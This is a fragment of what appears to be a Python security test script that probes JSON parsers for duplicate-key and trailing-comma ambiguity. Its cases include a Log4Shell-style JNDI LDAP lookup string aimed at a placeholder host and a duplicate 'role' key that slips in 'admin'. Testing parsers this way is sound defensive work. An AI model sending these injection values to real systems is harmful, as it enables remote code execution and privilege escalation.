...
def main() -> int:
    parser = argparse.ArgumentParser(description="Run TC-22 JSON duplicate key ambiguity probes.")
    ...
    cases = [
        ("baseline_unique", '{"q":"safe"}'),
        ("duplicate_key_conflict", '{"q":"safe","q":"${jndi:ldap://probe.invalid/tc22}"}'),
        ("duplicate_role_conflict", '{"role":"user","role":"admin"}'),
        ("lax_trailing_comma", '{"q":"${jndi:ldap://probe.invalid/tc22}",}'),
    ]
